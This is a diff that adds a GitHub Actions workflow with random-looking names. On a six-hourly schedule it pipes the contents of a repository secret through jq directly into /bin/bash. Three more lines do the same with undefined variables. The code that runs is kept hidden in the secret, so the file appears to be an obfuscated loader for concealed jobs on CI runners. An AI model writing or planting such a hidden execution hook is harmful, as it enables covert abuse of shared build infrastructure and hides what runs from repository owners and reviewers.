@@ -1,0 +1,21 @@
+name: qujiangyou6754
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qujiangyou6754
+        env:
+          r50656: ${{ secrets.r50656 }}
+        run: |
+          echo $r50656 | jq -r .ba60587 | /bin/bash
+          echo $jlvr9 | jq -r .x218 | /bin/bash
+          echo $x35283 | jq -r .btz783 | /bin/bash
+          echo $a625 | jq -r .fflzk439 | /bin/bash
+
